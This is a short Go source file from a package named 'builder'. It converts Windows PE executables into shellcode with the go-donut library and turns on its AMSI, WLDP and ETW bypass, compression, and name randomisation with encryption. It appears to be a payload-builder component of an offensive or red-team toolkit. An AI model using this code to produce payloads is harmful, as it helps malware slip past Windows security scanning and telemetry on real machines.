package builder

import (
	"bytes"
	"fmt"

	"github.com/Binject/go-donut/donut"
)

// PE2Shellcode converts a PE binary to position-independent shellcode
// using the go-donut library (wraps the Donut framework).
func PE2Shellcode(peData []byte) ([]byte, error) {
	if len(peData) == 0 {
		return nil, fmt.Errorf("empty PE data")
	}

	config := donut.DefaultConfig()
	config.ExitOpt = 2   // Exit thread (don't exit process)
	config.Bypass = 3    // AMSI+WLDP+ETW bypass
	config.Compress = 1  // aPLib compression
	config.Entropy = 3   // Random names + encryption
	config.Format = 1    // Raw binary output

	buf := bytes.NewBuffer(peData)
	shellcode, err := donut.ShellcodeFromBytes(buf, config)
	if err != nil {
		return nil, fmt.Errorf("donut conversion failed: %w", err)
	}

	return shellcode.Bytes(), nil
}
